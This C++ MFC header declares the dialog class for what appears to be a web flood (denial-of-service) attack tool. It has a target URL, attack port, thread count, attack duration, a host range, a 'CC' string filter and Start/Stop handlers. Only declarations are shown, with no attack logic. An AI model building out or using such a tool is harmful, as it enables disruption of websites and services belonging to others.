
#pragma once


/////////////////////////////////////////////////////////////////////////////
// CWebAttackDlg dialog
#include "EasySize.h"



class CWebAttackDlg : public CDialog
{
	DECLARE_DYNAMIC(CWebAttackDlg)
	// Construction
public:
	CWebAttackDlg(CWnd* pParent = NULL);   // standard constructor
	DECLARE_EASYSIZE

	VOID ShowThreads();
	VOID ShowPageNums();
	BOOL FilterCCString(LPWSTR szUrl, ATTACK& m_Attack, WORD& rPort);
	WORD GetPortNum(LPWSTR szUrl, WORD iPort, LPWSTR URL);
	WORD ForMatFlowAddr(LPWSTR szAddr, WORD iPort);

	LPVOID Point;
	//LPVOID ViewPoint;
	// Dialog Data
		//{{AFX_DATA(CWebAttackDlg)
	enum {	IDD = IDD_FLOWATTACK_DIALOG};
	// NOTE: the ClassWizard will add data members here
	CEdit	m_TargetCtrl;
	CSliderCtrl	m_TimeCtrl;
	CSliderCtrl	m_ThreadCtrl;
	CSpinButtonCtrl	m_HotsNumCtrl;
	CComboBox	m_ModelList;
	CListCtrl	m_TargetList;
	BOOL	m_SelectHost;
	UINT	m_HostNums;
	UINT	m_EndVar;
	UINT	m_Port;
	UINT	m_AttckTims;
	UINT	m_StartVar;
	CString	m_TargetWeb;
	DWORD	m_ThreadNums;
	CString	m_TipShow;
	CBrush m_brush;
	COLORREF clr;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CWebAttackDlg)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CWebAttackDlg)
	afx_msg void OnAddtask();
	afx_msg void OnCustomdrawSliderTime(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnCustomdrawSliderThread(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickListTarget(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	afx_msg void OnSelchangeComboModel();
	afx_msg void OnChangeTargetWeb();
	afx_msg void OnSetfocusStartvar();
	afx_msg void OnSetfocusTargetWeb();
	afx_msg void OnSetfocusComboModel();
	afx_msg void OnSetfocusThreadnums();
	afx_msg void OnChangeThreadnums();
	afx_msg void OnChangeAttacktimes();
	afx_msg void OnSetfocusAttacktimes();
	afx_msg void OnChangeAttckport();
	afx_msg void OnSetfocusAttckport();
	afx_msg void OnChangeHostnums();
	afx_msg void OnSetfocusHostnums();
	afx_msg void OnChangeStartvar();
	afx_msg void OnChangeEndvar();
	afx_msg void OnSetfocusEndvar();
	afx_msg void OnSelecthost();
	afx_msg void OnNewauto();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	virtual BOOL OnInitDialog();
	afx_msg void OnStart();
	afx_msg void OnStop();
	afx_msg void OnDeleteList();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	HBITMAP m_ListBk;
	WORD TaskID;
};

